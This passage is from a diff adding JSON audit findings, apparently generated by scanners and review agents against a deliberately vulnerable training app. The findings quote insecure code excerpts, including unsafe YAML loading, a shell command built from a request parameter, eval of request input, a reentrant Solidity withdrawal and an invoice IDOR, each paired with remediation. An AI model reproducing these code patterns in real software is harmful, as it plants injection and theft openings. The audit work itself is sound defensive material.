+      "safe_validation": "Review the cited code and its callers statically; confirm attacker control of inputs using local tests against a disposable copy only. Do not test the live target.",
+      "remediation": "Use JSON with a schema; never unpickle client data.",
+      "references": [
+        "https://docs.python.org/3/library/pickle.html",
+        "https://bandit.readthedocs.io/en/1.9.4/blacklists/blacklist_calls.html#b301-pickle"
+      ],
+      "limitations": [
+        "Detected by pattern-based tool (semgrep); reachability and exploitability not established.",
+        "Detected by pattern-based tool (bandit); reachability and exploitability not established."
+      ],
+      "source": {
+        "kind": "tool",
+        "name": "semgrep",
+        "rule_id": "workspace.projects.875dd5b0-fed6-440d-9d73-6a7abf69dc8a.work.sentinel-auditor.rules.semgrep.sentinel.python.pickle-untrusted",
+        "contributors": [
+          "bandit",
+          "semgrep"
+        ]
+      },
+      "fingerprint": "a4c90675842c",
+      "id": "SA-CWE502-a4c90675842c",
+      "history": [
+        {
+          "at": "2026-10-23T19:19:54.911878Z",
+          "event": "added",
+          "actor": "semgrep"
+        },
+        {
+          "at": "2026-10-23T19:19:56.135896Z",
+          "event": "merged",
+          "from": "bandit"
+        }
+      ],
+      "claimed_confidence": "medium",
+      "risk_zone": "YELLOW",
+      "business_impact": {
+        "technical_severity": "high",
+        "technical_priority": "P2",
+        "status": "assessed",
+        "asset_id": "shop-api",
+        "asset_criticality": "critical",
+        "asset_environment": "production",
+        "data_classes_at_risk": [
+          "pii",
+          "payment",
+          "credentials",
+          "authentication"
+        ],
+        "business_priority": "P2",
+        "business_severity": "high",
+        "program_expected_rating": null,
+        "context_source": "owner_provided",
+        "context_ref": "fixtures/vulnapp/README.md (training fixture; values are illustrative)",
+        "reviewed_by": null,
+        "notes": [],
+        "submission_recommendation": {
+          "decision": "needs_more_evidence",
+          "why": "not independently verified; do not submit as-is"
+        }
+      },
+      "financial_exposure": {
+        "method": "unknown",
+        "statement": "Financial exposure cannot be reliably quantified from the available evidence.",
+        "reason": "no estimate supplied",
+        "is_actual_loss": false,
+        "is_bounty_estimate": false
+      }
+    },
+    {
+      "title": "Unsafe YAML deserialization",
+      "category": "deserialization",
+      "cwe": "CWE-502",
+      "component": "app",
+      "target_id": "vulnapp",
+      "locations": [
+        {
+          "role": "location",
+          "file": "app/app.py",
+          "start_line": 49,
+          "end_line": 49
+        }
+      ],
+      "evidence": [
+        {
+          "kind": "code_excerpt",
+          "content": "    settings = yaml.load(request.data, Loader=yaml.Loader)",
+          "file": "app/app.py",
+          "start_line": 49,
+          "end_line": 49,
+          "verified": true,
+          "verification_note": "matched lines 47-51"
+        }
+      ],
+      "description": "yaml.load with an unsafe Loader can construct arbitrary Python objects.",
+      "preconditions": [
+        "Code path is reachable in the deployed configuration (not verified by the tool)."
+      ],
+      "attack_scenario": "Not established by the tool; requires analyst review of reachability and attacker control.",
+      "expected_boundary": "Untrusted input should not reach this operation without validation/authorization.",
+      "observed_behavior": "Pattern matched by semgrep rule workspace.projects.875dd5b0-fed6-440d-9d73-6a7abf69dc8a.work.sentinel-auditor.rules.semgrep.sentinel.python.unsafe-yaml-load.",
+      "technical_impact": "Depends on reachability and attacker control of the input.",
+      "severity": "high",
+      "severity_basis": "tool_default",
+      "cvss": null,
+      "confidence": "medium",
+      "verification": {
+        "status": "potential",
+        "basis": [
+          "tool:semgrep"
+        ]
+      },
+      "safe_validation": "Review the cited code and its callers statically; confirm attacker control of inputs using local tests against a disposable copy only. Do not test the live target.",
+      "remediation": "Use yaml.safe_load.",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/502.html",
+        "https://bandit.readthedocs.io/en/1.9.4/plugins/b506_yaml_load.html"
+      ],
+      "limitations": [
+        "Detected by pattern-based tool (semgrep); reachability and exploitability not established.",
+        "Detected by pattern-based tool (bandit); reachability and exploitability not established."
+      ],
+      "source": {
+        "kind": "tool",
+        "name": "semgrep",
+        "rule_id": "workspace.projects.875dd5b0-fed6-440d-9d73-6a7abf69dc8a.work.sentinel-auditor.rules.semgrep.sentinel.python.unsafe-yaml-load",
+        "contributors": [
+          "bandit",
+          "semgrep"
+        ]
+      },
+      "fingerprint": "cc9c91b35af7",
+      "id": "SA-CWE502-cc9c91b35af7",
+      "history": [
+        {
+          "at": "2026-10-23T19:19:54.910672Z",
+          "event": "added",
+          "actor": "semgrep"
+        },
+        {
+          "at": "2026-10-23T19:19:56.134730Z",
+          "event": "merged",
+          "from": "bandit"
+        }
+      ],
+      "claimed_confidence": "medium",
+      "risk_zone": "YELLOW",
+      "business_impact": {
+        "technical_severity": "high",
+        "technical_priority": "P2",
+        "status": "assessed",
+        "asset_id": "shop-api",
+        "asset_criticality": "critical",
+        "asset_environment": "production",
+        "data_classes_at_risk": [
+          "pii",
+          "payment",
+          "credentials",
+          "authentication"
+        ],
+        "business_priority": "P2",
+        "business_severity": "high",
+        "program_expected_rating": null,
+        "context_source": "owner_provided",
+        "context_ref": "fixtures/vulnapp/README.md (training fixture; values are illustrative)",
+        "reviewed_by": null,
+        "notes": [],
+        "submission_recommendation": {
+          "decision": "needs_more_evidence",
+          "why": "not independently verified; do not submit as-is"
+        }
+      },
+      "financial_exposure": {
+        "method": "unknown",
+        "statement": "Financial exposure cannot be reliably quantified from the available evidence.",
+        "reason": "no estimate supplied",
+        "is_actual_loss": false,
+        "is_bounty_estimate": false
+      }
+    },
+    {
+      "title": "Command built from request data",
+      "category": "command-injection",
+      "cwe": "CWE-78",
+      "component": "web",
+      "target_id": "vulnapp",
+      "locations": [
+        {
+          "role": "location",
+          "file": "web/index.js",
+          "start_line": 7,
+          "end_line": 7
+        }
+      ],
+      "evidence": [
+        {
+          "kind": "code_excerpt",
+          "content": "  exec(`ping -c 1 ${req.query.host}`, (err, out) => res.send(out));",
+          "file": "web/index.js",
+          "start_line": 7,
+          "end_line": 7,
+          "verified": true,
+          "verification_note": "matched lines 5-9"
+        }
+      ],
+      "description": "Shell command built from request data and executed with child_process.exec.",
+      "preconditions": [
+        "Code path is reachable in the deployed configuration (not verified by the tool)."
+      ],
+      "attack_scenario": "Not established by the tool; requires analyst review of reachability and attacker control.",
+      "expected_boundary": "Untrusted input should not reach this operation without validation/authorization.",
+      "observed_behavior": "Pattern matched by semgrep rule workspace.projects.875dd5b0-fed6-440d-9d73-6a7abf69dc8a.work.sentinel-auditor.rules.semgrep.sentinel.js.child-process-exec-template.",
+      "technical_impact": "Depends on reachability and attacker control of the input.",
+      "severity": "high",
+      "severity_basis": "tool_default",
+      "cvss": null,
+      "confidence": "medium",
+      "verification": {
+        "status": "potential",
+        "basis": [
+          "tool:semgrep"
+        ]
+      },
+      "safe_validation": "Review the cited code and its callers statically; confirm attacker control of inputs using local tests against a disposable copy only. Do not test the live target.",
+      "remediation": "Use execFile/spawn with an argument array and strict validation.",
+      "references": [],
+      "limitations": [
+        "Detected by pattern-based tool (semgrep); reachability and exploitability not established."
+      ],
+      "source": {
+        "kind": "tool",
+        "name": "semgrep",
+        "rule_id": "workspace.projects.875dd5b0-fed6-440d-9d73-6a7abf69dc8a.work.sentinel-auditor.rules.semgrep.sentinel.js.child-process-exec-template"
+      },
+      "fingerprint": "6956e11f61fa",
+      "id": "SA-CWE78-6956e11f61fa",
+      "history": [
+        {
+          "at": "2026-10-23T19:19:54.916918Z",
+          "event": "added",
+          "actor": "semgrep"
+        }
+      ],
+      "claimed_confidence": "medium",
+      "risk_zone": "YELLOW",
+      "business_impact": {
+        "technical_severity": "high",
+        "technical_priority": "P2",
+        "status": "assessed",
+        "asset_id": "shop-other",
+        "asset_criticality": "medium",
+        "asset_environment": "unknown",
+        "data_classes_at_risk": [
+          "internal"
+        ],
+        "business_priority": "P2",
+        "business_severity": "high",
+        "program_expected_rating": null,
+        "context_source": "owner_provided",
+        "context_ref": "fixtures/vulnapp/README.md (training fixture; values are illustrative)",
+        "reviewed_by": null,
+        "notes": [],
+        "submission_recommendation": {
+          "decision": "needs_more_evidence",
+          "why": "not independently verified; do not submit as-is"
+        }
+      },
+      "financial_exposure": {
+        "method": "unknown",
+        "statement": "Financial exposure cannot be reliably quantified from the available evidence.",
+        "reason": "no estimate supplied",
+        "is_actual_loss": false,
+        "is_bounty_estimate": false
+      }
+    },
+    {
+      "title": "External call before state update",
+      "category": "reentrancy",
+      "cwe": "CWE-841",
+      "component": "contracts",
+      "target_id": "vulnapp",
+      "locations": [
+        {
+          "role": "location",
+          "file": "contracts/Vault.sol",
+          "start_line": 15,
+          "end_line": 17
+        }
+      ],
+      "evidence": [
+        {
+          "kind": "code_excerpt",
+          "content": "        (bool ok, ) = msg.sender.call{value: amount}(\"\");\n        require(ok, \"transfer failed\");\n        balances[msg.sender] -= amount;",
+          "file": "contracts/Vault.sol",
+          "start_line": 15,
+          "end_line": 17,
+          "verified": true,
+          "verification_note": "matched lines 13-19"
+        }
+      ],
+      "description": "External call with value precedes a state write in the same function (possible reentrancy); verify with a reentrancy guard / CEI review.",
+      "preconditions": [
+        "Code path is reachable in the deployed configuration (not verified by the tool)."
+      ],
+      "attack_scenario": "Not established by the tool; requires analyst review of reachability and attacker control.",
+      "expected_boundary": "Untrusted input should not reach this operation without validation/authorization.",
+      "observed_behavior": "Pattern matched by semgrep rule workspace.projects.875dd5b0-fed6-440d-9d73-6a7abf69dc8a.work.sentinel-auditor.rules.semgrep.sentinel.solidity.call-before-state-update.",
+      "technical_impact": "Depends on reachability and attacker control of the input.",
+      "severity": "high",
+      "severity_basis": "tool_default",
+      "cvss": null,
+      "confidence": "medium",
+      "verification": {
+        "status": "potential",
+        "basis": [
+          "tool:semgrep"
+        ]
+      },
+      "safe_validation": "Review the cited code and its callers statically; confirm attacker control of inputs using local tests against a disposable copy only. Do not test the live target.",
+      "remediation": "See rule references.",
+      "references": [],
+      "limitations": [
+        "Detected by pattern-based tool (semgrep); reachability and exploitability not established."
+      ],
+      "source": {
+        "kind": "tool",
+        "name": "semgrep",
+        "rule_id": "workspace.projects.875dd5b0-fed6-440d-9d73-6a7abf69dc8a.work.sentinel-auditor.rules.semgrep.sentinel.solidity.call-before-state-update"
+      },
+      "fingerprint": "3dc2d1f78292",
+      "id": "SA-CWE841-3dc2d1f78292",
+      "history": [
+        {
+          "at": "2026-10-23T19:19:54.915673Z",
+          "event": "added",
+          "actor": "semgrep"
+        }
+      ],
+      "claimed_confidence": "medium",
+      "risk_zone": "YELLOW",
+      "business_impact": {
+        "technical_severity": "high",
+        "technical_priority": "P2",
+        "status": "assessed",
+        "asset_id": "vault-contract",
+        "asset_criticality": "high",
+        "asset_environment": "production",
+        "data_classes_at_risk": [
+          "funds"
+        ],
+        "business_priority": "P2",
+        "business_severity": "high",
+        "program_expected_rating": null,
+        "context_source": "owner_provided",
+        "context_ref": "fixtures/vulnapp/README.md (training fixture; values are illustrative)",
+        "reviewed_by": null,
+        "notes": [],
+        "submission_recommendation": {
+          "decision": "needs_more_evidence",
+          "why": "not independently verified; do not submit as-is"
+        }
+      },
+      "financial_exposure": {
+        "method": "unknown",
+        "statement": "Financial exposure cannot be reliably quantified from the available evidence.",
+        "reason": "no estimate supplied",
+        "is_actual_loss": false,
+        "is_bounty_estimate": false
+      }
+    },
+    {
+      "title": "eval of request data",
+      "category": "code-injection",
+      "cwe": "CWE-95",
+      "component": "web",
+      "target_id": "vulnapp",
+      "locations": [
+        {
+          "role": "location",
+          "file": "web/index.js",
+          "start_line": 11,
+          "end_line": 11
+        }
+      ],
+      "evidence": [
+        {
+          "kind": "code_excerpt",
+          "content": "  res.send(String(eval(req.query.expr)));",
+          "file": "web/index.js",
+          "start_line": 11,
+          "end_line": 11,
+          "verified": true,
+          "verification_note": "matched lines 9-13"
+        }
+      ],
+      "description": "eval() of request data enables arbitrary code execution.",
+      "preconditions": [
+        "Code path is reachable in the deployed configuration (not verified by the tool)."
+      ],
+      "attack_scenario": "Not established by the tool; requires analyst review of reachability and attacker control.",
+      "expected_boundary": "Untrusted input should not reach this operation without validation/authorization.",
+      "observed_behavior": "Pattern matched by semgrep rule workspace.projects.875dd5b0-fed6-440d-9d73-6a7abf69dc8a.work.sentinel-auditor.rules.semgrep.sentinel.js.eval-request.",
+      "technical_impact": "Depends on reachability and attacker control of the input.",
+      "severity": "high",
+      "severity_basis": "tool_default",
+      "cvss": null,
+      "confidence": "medium",
+      "verification": {
+        "status": "potential",
+        "basis": [
+          "tool:semgrep"
+        ]
+      },
+      "safe_validation": "Review the cited code and its callers statically; confirm attacker control of inputs using local tests against a disposable copy only. Do not test the live target.",
+      "remediation": "Never eval user input; use a safe expression parser.",
+      "references": [],
+      "limitations": [
+        "Detected by pattern-based tool (semgrep); reachability and exploitability not established."
+      ],
+      "source": {
+        "kind": "tool",
+        "name": "semgrep",
+        "rule_id": "workspace.projects.875dd5b0-fed6-440d-9d73-6a7abf69dc8a.work.sentinel-auditor.rules.semgrep.sentinel.js.eval-request"
+      },
+      "fingerprint": "e2c5fee2d296",
+      "id": "SA-CWE95-e2c5fee2d296",
+      "history": [
+        {
+          "at": "2026-10-23T19:19:54.917927Z",
+          "event": "added",
+          "actor": "semgrep"
+        }
+      ],
+      "claimed_confidence": "medium",
+      "risk_zone": "YELLOW",
+      "business_impact": {
+        "technical_severity": "high",
+        "technical_priority": "P2",
+        "status": "assessed",
+        "asset_id": "shop-other",
+        "asset_criticality": "medium",
+        "asset_environment": "unknown",
+        "data_classes_at_risk": [
+          "internal"
+        ],
+        "business_priority": "P2",
+        "business_severity": "high",
+        "program_expected_rating": null,
+        "context_source": "owner_provided",
+        "context_ref": "fixtures/vulnapp/README.md (training fixture; values are illustrative)",
+        "reviewed_by": null,
+        "notes": [],
+        "submission_recommendation": {
+          "decision": "needs_more_evidence",
+          "why": "not independently verified; do not submit as-is"
+        }
+      },
+      "financial_exposure": {
+        "method": "unknown",
+        "statement": "Financial exposure cannot be reliably quantified from the available evidence.",
+        "reason": "no estimate supplied",
+        "is_actual_loss": false,
+        "is_bounty_estimate": false
+      }
+    },
+    {
+      "target_id": "vulnapp",
+      "references": [
+        "https://cwe.mitre.org/data/definitions/639.html",
+        "https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/"
+      ],
+      "limitations": [
+        "Assumes no ownership enforcement outside this file (e.g. DB RLS); none was found in the snapshot."
+      ],
+      "preconditions": [
+        "Attacker holds any valid account (login_required is the only guard)",
+        "Invoice ids are guessable integers (route uses <int:invoice_id>)"
+      ],
+      "title": "Any authenticated user can read any invoice (IDOR in get_invoice)",
+      "category": "idor",
+      "cwe": "CWE-639",
+      "component": "app",
+      "locations": [
+        {
+          "file": "app/app.py",
+          "start_line": 22,
+          "end_line": 29,
+          "function": "get_invoice",
+          "role": "sink"
+        },
+        {
+          "file": "app/app.py",
+          "start_line": 84,
+          "end_line": 84,
+          "function": "apply_coupon",
+          "role": "check"
+        }
+      ],
+      "evidence": [
+        {
+          "kind": "code_excerpt",
+          "file": "app/app.py",
+          "start_line": 26,
+          "end_line": 29,
+          "content": "row = db().execute(\"SELECT id, owner_id, total FROM invoices WHERE id = ?\", (invoice_id,)).fetchone()\nif row is None:\n    abort(404)\nreturn jsonify({\"id\": row[0], \"owner\": row[1], \"total\": row[2]})",
+          "verified": true,
+          "verification_note": "matched lines 24-31"
+        },
+        {
+          "kind": "code_excerpt",
+          "file": "app/app.py",
+          "start_line": 84,
+          "end_line": 84,
+          "content": "cart = db().execute(\"SELECT id, total FROM carts WHERE user_id = ?\", (current_user().id,)).fetchone()",
+          "verified": true,
+          "verification_note": "matched lines 82-86"
+        }
+      ],
+      "description": "get_invoice looks up an invoice solely by the client-supplied id. owner_id is fetched and even returned, but never compared to the session user. Elsewhere (apply_coupon) the code scopes queries by current_user().id, showing the intended ownership pattern.",
+      "attack_scenario": "A logged-in user changes the numeric id in /invoices/<id> to another customer's invoice id and receives that invoice's owner and total. (Not executed.)",
+      "expected_boundary": "A user can read only invoices where owner_id equals their user id.",
+      "observed_behavior": "Query filters by id only; no owner comparison on any path in the handler.",
+      "technical_impact": "Horizontal disclosure of all customers' invoice data (owner id, totals).",
+      "severity": "medium",
+      "confidence": "high",
+      "verification": {
+        "status": "confirmed_static",
+        "rationale": "get_invoice is reachable by any session (login_required only), selects by id alone and never compares owner_id; no before_request hook, middleware or DB policy in the snapshot adds an ownership check.",
+        "reviewed_by": "sentinel-verifier",
+        "basis": [],
+        "missing_prerequisites": [],
+        "alternative_explanations": []
+      },
+      "safe_validation": "Static: confirm no middleware or DB row-level policy enforces ownership; optionally write a unit test against a local throwaway DB fixture (never production).",
+      "remediation": "Filter by owner: WHERE id = ? AND owner_id = ? with current_user().id, or check row[1] == current_user().id and return 404 otherwise.",
+      "source": {
+        "kind": "agent",
+        "name": "sentinel-authz"
+      },
+      "fingerprint": "f1987c925021",
+      "id": "SA-CWE639-f1987c925021",
+      "history": [
+        {
+          "at": "2026-10-23T19:19:59.794438Z",
+          "event": "added",
+          "actor": "sentinel-authz"
+        },
+        {
+          "at": "2026-10-23T19:20:00.724456Z",
+          "event": "status",
+          "status": "confirmed_static",
+          "by": "sentinel-verifier"
+        },
+        {
+          "at": "2026-10-23T19:20:01.714668Z",
+          "event": "score",
+          "note": "severity high -> medium to match CVSS 6.5"
+        }
+      ],
+      "severity_basis": "cvss",
+      "claimed_confidence": "high",
+      "risk_zone": "YELLOW",
+      "business_impact": {
+        "technical_severity": "medium",
+        "technical_priority": "P3",
+        "status": "assessed",
+        "asset_id": "shop-api",
+        "asset_criticality": "critical",
+        "asset_environment": "production",
+        "data_classes_at_risk": [
+          "pii",
+          "payment"
+        ],
+        "business_priority": "P2",
+        "business_severity": "high",
+        "program_expected_rating": {
+          "rating": "high",
+          "matched_on": "idor",
+          "scale": "custom",
+          "source": "fixtures/vulnapp/README.md (training fixture; values are illustrative)"
+        },
+        "context_source": "owner_provided",
+        "context_ref": "fixtures/vulnapp/README.md (training fixture; values are illustrative)",
+        "reviewed_by": "sentinel-business-impact",
+        "notes": [
+          "reviewer raised one step: Invoices on the critical-tier billing API carry customer PII and payment data; for a shop, cross-customer invoice disclosure is a reportable privacy incident, s"
+        ],
+        "submission_recommendation": {
+          "decision": "candidate_for_manual_submission",
+          "why": "verified with meaningful business priority; a human must review, check duplicates and program rules"
+        },
+        "business_scenario": "Any logged-in customer could read other customers' invoices: names, billing addresses and amounts paid.",
+        "assumptions": [
+          "Invoice records belong to real customers in production (owner-stated)"
+        ]
+      },
+      "cvss": {
+        "version": "3.1",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+        "rationale": "Any account reads other users' invoices; no write impact.",
+        "score": 6.5
+      },
+      "business_review": {
+        "adjustment": 1,
+        "rationale": "Invoices on the critical-tier billing API carry customer PII and payment data; for a shop, cross-customer invoice disclosure is a reportable privacy incident, so one step above the read-only CVSS medium is justified.",
+        "affected_data_classes": [
+          "pii",
+          "payment"
+        ],
+        "program_rating_ref": "business_context.program_severity.category_ratings.idor = high",
+        "business_scenario": "Any logged-in customer could read other customers' invoices: names, billing addresses and amounts paid.",
+        "assumptions": [
+          "Invoice records belong to real customers in production (owner-stated)"
+        ]
+      },
+      "business_reviewer": "sentinel-business-impact",
+      "financial_exposure": {
+        "method": "unknown",
+        "statement": "Financial exposure cannot be reliably quantified from the available evidence.",
+        "reason": "no estimate supplied",
+        "is_actual_loss": false,
+        "is_bounty_estimate": false
+      }
+    },
+    {
+      "title": "lodash 4.17.15 has 6 known vulnerabilities (CVE-2020-28500, CVE-2020-8203, CVE-2021-23337…)",
+      "category": "vulnerable-dependency",
+      "cwe": "CWE-1395",
+      "component": "package-lock.json",
+      "target_id": "vulnapp",
+      "locations": [
+        {
+          "role": "location",
+          "file": "package-lock.json",
+          "start_line": 7,
+          "end_line": 7
+        }
+      ],
+      "evidence": [
+        {
+          "kind": "config_excerpt",
+          "content": "    \"\": {\"name\": \"vulnapp-frontend\", \"version\": \"1.0.0\", \"dependencies\": {\"lodash\": \"4.17.15\"}},",
+          "file": "package-lock.json",
+          "start_line": 7,
+          "end_line": 7,
+          "verified": true,
+          "verification_note": "matched lines 5-9"
+        }
+      ],
+      "description": "Regular Expression Denial of Service (ReDoS) in lodash; Command Injection in lodash; lodash vulnerable to Prototype Pollution via array path bypass in `_.unset` and `_.omit`; Prototype Pollution in lodash; lodash vulnerable to Code Injection via `_.template` imports key names",
+      "preconditions": [
+        "Code path is reachable in the deployed configuration (not verified by the tool)."
+      ],
+      "attack_scenario": "Not established by the tool; requires analyst review of reachability and attacker control.",
+      "expected_boundary": "Untrusted input should not reach this operation without validation/authorization.",
+      "observed_behavior": "Pattern matched by osv-scanner rule npm:lodash@4.17.15.",
+      "technical_impact": "Depends on whether the application uses the vulnerable functionality.",
+      "severity": "high",
+      "severity_basis": "cvss",
+      "cvss": {
+        "version": "3.1",
+        "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "rationale": "Highest upstream advisory base vector among the package's advisories; application reachability not assessed.",
+        "score": 8.1
+      },
+      "confidence": "medium",
+      "verification": {
+        "status": "potential",
+        "basis": [
+          "tool:osv-scanner"
+        ]
+      },
+      "safe_validation": "Review the cited code and its callers statically; confirm attacker control of inputs using local tests against a disposable copy only. Do not test the live target.",
+      "remediation": "Upgrade lodash to a version that fixes all listed advisories; verify compatibility.",
+      "references": [
+        "https://osv.dev/vulnerability/CVE-2020-28500",
+        "https://osv.dev/vulnerability/CVE-2020-8203",
+        "https://osv.dev/vulnerability/CVE-2021-23337",
+        "https://osv.dev/vulnerability/CVE-2025-13465",
+        "https://osv.dev/vulnerability/CVE-2026-2950"
+      ],
+      "limitations": [
+        "Version match only; reachability of vulnerable code not established.",
+        "Upstream CVSS describes the library, not this application."
+      ],
+      "source": {
+        "kind": "tool",
+        "name": "osv-scanner",
+        "rule_id": "npm:lodash@4.17.15"
+      },
+      "fingerprint": "20301f2d76bc",
+      "id": "SA-CWE1395-20301f2d76bc",
+      "history": [
+        {
+          "at": "2026-10-23T19:19:59.534249Z",
+          "event": "added",
+          "actor": "osv-scanner"
+        },
+        {
+          "at": "2026-10-23T19:19:59.576323Z",
+          "event": "score",
+          "note": "severity medium -> high to match CVSS 8.1"
+        }
+      ],
+      "claimed_confidence": "medium",
+      "risk_zone": "YELLOW",
+      "business_impact": {
+        "technical_severity": "high",
+        "technical_priority": "P2",
+        "status": "assessed",
+        "asset_id": "build-and-ci",
+        "asset_criticality": "medium",
+        "asset_environment": "production",
+        "data_classes_at_risk": [
+          "secrets"
+        ],
+        "business_priority": "P3",
+        "business_severity": "medium",
+        "program_expected_rating": null,
+        "context_source": "owner_provided",
+        "context_ref": "fixtures/vulnapp/README.md (training fixture; values are illustrative)",
+        "reviewed_by": null,
+        "notes": [
+          "not internet-exposed (-1)"
+        ],
+        "submission_recommendation": {
+          "decision": "needs_more_evidence",
+          "why": "not independently verified; do not submit as-is"
+        }
+      },
+      "financial_exposure": {
+        "method": "unknown",
+        "statement": "Financial exposure cannot be reliably quantified from the available evidence.",
+        "reason": "no estimate supplied",
+        "is_actual_loss": false,
+        "is_bounty_estimate": false
+      }
+    },
+    {
+      "title": "jinja2 2.10 has 6 known vulnerabilities (CVE-2019-10906, CVE-2020-28493, CVE-2024-22195…)",
+      "category": "vulnerable-dependency",
+      "cwe": "CWE-1395",
+      "component": "requirements.txt",
+      "target_id": "vulnapp",
+      "locations": [
+        {
+          "role": "location",
+          "file": "requirements.txt",
+          "start_line": 4,
+          "end_line": 4
+        }
+      ],
+      "evidence": [
+        {
+          "kind": "config_excerpt",
+          "content": "jinja2==2.10",
+          "file": "requirements.txt",
+          "start_line": 4,
+          "end_line": 4,
+          "verified": true,
+          "verification_note": "matched lines 2-4"
+        }
+      ],
+      "description": "PYSEC-2019-217; PYSEC-2021-66; Jinja2 vulnerable to sandbox breakout through attr filter selecting format method; Jinja vulnerable to HTML attribute injection when passing user input as keys to xmlattr filter; Jinja vulnerable to HTML attribute injection when passing user input as keys to xmlattr filter",
+      "preconditions": [
+        "Code path is reachable in the deployed configuration (not verified by the tool)."
+      ],
+      "attack_scenario": "Not established by the tool; requires analyst review of reachability and attacker control.",
+      "expected_boundary": "Untrusted input should not reach this operation without validation/authorization.",
+      "observed_behavior": "Pattern matched by osv-scanner rule PyPI:jinja2@2.10.",
+      "technical_impact": "Depends on whether the application uses the vulnerable functionality.",
+      "severity": "high",
+      "severity_basis": "cvss",
+      "cvss": {
+        "version": "3.1",
+        "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+        "rationale": "Highest upstream advisory base vector among the package's advisories; application reachability not assessed.",
+        "score": 7.8
+      },
+      "confidence": "medium",
+      "verification": {
+        "status": "potential",
+        "basis": [
+          "tool:osv-scanner"
+        ]
+      },
+      "safe_validation": "Review the cited code and its callers statically; confirm attacker control of inputs using local tests against a disposable copy only. Do not test the live target.",
+      "remediation": "Upgrade jinja2 to a version that fixes all listed advisories; verify compatibility.",
+      "references": [
+        "https://osv.dev/vulnerability/CVE-2019-10906",
+        "https://osv.dev/vulnerability/CVE-2020-28493",
+        "https://osv.dev/vulnerability/CVE-2024-22195",
+        "https://osv.dev/vulnerability/CVE-2024-34064",
+        "https://osv.dev/vulnerability/CVE-2024-56326"
+      ],
+      "limitations": [
+        "Version match only; reachability of vulnerable code not established.",
+        "Upstream CVSS describes the library, not this application."
+      ],
+      "source": {
+        "kind": "tool",
+        "name": "osv-scanner",
+        "rule_id": "PyPI:jinja2@2.10"
+      },
+      "fingerprint": "7c30e220b78e",
+      "id": "SA-CWE1395-7c30e220b78e",
+      "history": [
+        {
+          "at": "2026-10-23T19:19:59.536634Z",
+          "event": "added",
+          "actor": "osv-scanner"
+        },
+        {
+          "at": "2026-10-23T19:19:59.576384Z",
+          "event": "score",
+          "note": "severity medium -> high to match CVSS 7.8"
+        }
+      ],
+      "claimed_confidence": "medium",
+      "risk_zone": "YELLOW",
+      "business_impact": {
+        "technical_severity": "high",
+        "technical_priority": "P2",
+        "status": "assessed",
+        "asset_id": "build-and-ci",
+        "asset_criticality": "medium",
+        "asset_environment": "production",
+        "data_classes_at_risk": [
+          "secrets"
+        ],
+        "business_priority": "P3",
+        "business_severity": "medium",
+        "program_expected_rating": null,
+        "context_source": "owner_provided",
+        "context_ref": "fixtures/vulnapp/README.md (training fixture; values are illustrative)",
+        "reviewed_by": null,
+        "notes": [
+          "not internet-exposed (-1)"
+        ],
+        "submission_recommendation": {
+          "decision": "needs_more_evidence",
+          "why": "not independently verified; do not submit as-is"
+        }
+      },
+      "financial_exposure": {
+        "method": "unknown",
+        "statement": "Financial exposure cannot be reliably quantified from the available evidence.",
+        "reason": "no estimate supplied",
+        "is_actual_loss": false,
+        "is_bounty_estimate": false
+      }
+    },
+    {
+      "title": "flask 0.12.2 has 4 known vulnerabilities (CVE-2018-1000656, CVE-2019-1010083, CVE-2023-30861…)",
+      "category": "vulnerable-dependency",
+      "cwe": "CWE-1395",
+      "component": "requirements.txt",
+      "target_id": "vulnapp",
+      "locations": [
+        {
+          "role": "location",
+          "file": "requirements.txt",
+          "start_line": 1,
+          "end_line": 1
+        }
+      ],
+      "evidence": [
+        {
+          "kind": "config_excerpt",
+          "content": "flask==0.12.2",
+          "file": "requirements.txt",
+          "start_line": 1,
+          "end_line": 1,
+          "verified": true,
+          "verification_note": "matched lines 1-3"
+        }
+      ],
+      "description": "PYSEC-2018-66; PYSEC-2019-179; PYSEC-2023-62; PYSEC-2026-2151; Flask is vulnerable to Denial of Service via incorrect encoding of JSON data",
+      "preconditions": [
+        "Code path is reachable in the deployed configuration (not verified by the tool)."
+      ],
+      "attack_scenario": "Not established by the tool; requires analyst review of reachability and attacker control.",
+      "expected_boundary": "Untrusted input should not reach this operation without validation/authorization.",
+      "observed_behavior": "Pattern matched by osv-scanner rule PyPI:flask@0.12.2.",
+      "technical_impact": "Depends on whether the application uses the vulnerable functionality.",
+      "severity": "high",
+      "severity_basis": "cvss",
+      "cvss": {
+        "version": "3.1",
+        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "rationale": "Highest upstream advisory base vector among the package's advisories; application reachability not assessed.",
+        "score": 7.5
+      },
+      "confidence": "medium",
+      "verification": {
+        "status": "potential",
+        "basis": [
+          "tool:osv-scanner"
+        ]
+      },
+      "safe_validation": "Review the cited code and its callers statically; confirm attacker control of inputs using local tests against a disposable copy only. Do not test the live target.",
+      "remediation": "Upgrade flask to a version that fixes all listed advisories; verify compatibility.",
+      "references": [
+        "https://osv.dev/vulnerability/CVE-2018-1000656",
+        "https://osv.dev/vulnerability/CVE-2019-1010083",
+        "https://osv.dev/vulnerability/CVE-2023-30861",
+        "https://osv.dev/vulnerability/CVE-2026-27205"
+      ],
+      "limitations": [
+        "Version match only; reachability of vulnerable code not established.",
+        "Upstream CVSS describes the library, not this application."
+      ],
+      "source": {
+        "kind": "tool",
+        "name": "osv-scanner",
+        "rule_id": "PyPI:flask@0.12.2"
+      },
+      "fingerprint": "b2cde1ba6726",
+      "id": "SA-CWE1395-b2cde1ba6726",
+      "history": [
+        {
+          "at": "2026-10-23T19:19:59.535464Z",
+          "event": "added",
+          "actor": "osv-scanner"
+        },
+        {
+          "at": "2026-10-23T19:19:59.576356Z",
+          "event": "score",
+          "note": "severity medium -> high to match CVSS 7.5"
+        }
+      ],
+      "claimed_confidence": "medium",
+      "risk_zone": "YELLOW",
+      "business_impact": {
+        "technical_severity": "high",
+        "technical_priority": "P2",
+        "status": "assessed",
+        "asset_id": "build-and-ci",
+        "asset_criticality": "medium",
+        "asset_environment": "production",
+        "data_classes_at_risk": [
+          "secrets"
+        ],
+        "business_priority": "P3",
+        "business_severity": "medium",
+        "program_expected_rating": null,
+        "context_source": "owner_provided",
